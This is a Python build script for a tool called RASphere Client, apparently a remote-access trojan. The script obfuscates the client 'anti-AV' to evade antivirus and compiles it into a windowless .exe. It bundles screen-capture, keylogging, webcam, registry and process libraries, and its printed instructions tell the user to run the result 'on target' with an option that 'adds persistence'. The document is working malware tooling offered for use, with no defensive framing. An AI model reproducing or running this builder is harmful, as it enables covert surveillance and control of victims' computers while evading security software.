#!/usr/bin/env python3
"""
RASphere Client Builder
=======================
1. Obfuscates client.py (anti-AV)
2. Compiles to standalone .exe

Usage: python build_client.py [--no-obfuscate]

Before building, edit these variables in client.py:
    _SERVER  = "https://your-server.com"
    _SECRET  = "your-secret-key"
    _RECON   = 5
"""

import os, sys, subprocess

def main():
    use_obf = "--no-obfuscate" not in sys.argv

    print("=" * 50)
    print("  RASphere Client Builder")
    print("=" * 50)

    # Ensure PyInstaller installed
    try:
        import PyInstaller
    except ImportError:
        print("[*] Installing PyInstaller...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", "pyinstaller"])

    source = "client.py"

    # Step 1: Obfuscate
    if use_obf and os.path.exists("obfuscator.py"):
        print("\n[*] Step 1: Obfuscating...")
        r = subprocess.run([sys.executable, "obfuscator.py", "--input", source, "--output", "obfuscated_client.py"])
        if r.returncode != 0:
            print("[!] Obfuscation failed, using original file")
            source = "client.py"
        else:
            source = "obfuscated_client.py"
    else:
        print("\n[*] Skipping obfuscation")
        source = "client.py"

    # Step 2: Build .exe
    print(f"\n[*] Step 2: Compiling {source} -> .exe...")
    cmd = [
        sys.executable, "-m", "PyInstaller",
        "--onefile", "--noconsole",
        "--name", "RASphereClient",
        "--hidden-import", "socketio",
        "--hidden-import", "engineio",
        "--hidden-import", "mss",
        "--hidden-import", "PIL",
        "--hidden-import", "pynput",
        "--hidden-import", "psutil",
        "--hidden-import", "cv2",
        "--hidden-import", "winreg",
        "--hidden-import", "winsound",
        "--hidden-import", "winreg",
        "--clean", source
    ]

    r = subprocess.run(cmd)
    if r.returncode == 0:
        print(f"\n[+] SUCCESS: dist/RASphereClient.exe")
        print(f"\n    Run on target: RASphereClient.exe")
        print(f"    (uses built-in _SERVER and _SECRET from client.py)")
        print(f"\n    Or with args:")
        print(f"    RASphereClient.exe --install  (adds persistence)")
        print(f"    RASphereClient.exe --server URL --secret KEY")
    else:
        print(f"\n[!] Build failed")
        sys.exit(1)

    # Cleanup obfuscated file
    if use_obf and os.path.exists("obfuscated_client.py"):
        try: os.remove("obfuscated_client.py")
        except: pass

if __name__ == "__main__":
    main()
